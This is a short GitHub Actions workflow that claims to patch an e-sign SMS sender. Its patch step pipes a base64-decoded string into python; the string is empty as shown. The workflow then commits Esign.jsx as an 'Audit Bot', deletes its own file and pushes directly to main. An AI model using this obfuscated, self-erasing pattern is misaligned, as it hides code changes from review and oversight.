name: Secure ESign Send SMS
on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/fix-esign-send-sms.yml'
jobs:
  fix:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - name: Patch Esign SMS sender
        run: echo '' | base64 -d | python
      - run: npm ci
      - run: npm run build
      - name: Commit source fix
        run: |
          git config user.name 'RomyLabs Audit Bot'
          git config user.email 'rcruz187@gmail.com'
          git add src/pages/Esign.jsx
          git rm .github/workflows/fix-esign-send-sms.yml
          git commit -m 'fix(esign): route signing-link SMS through secured sender'
          git push origin HEAD:main
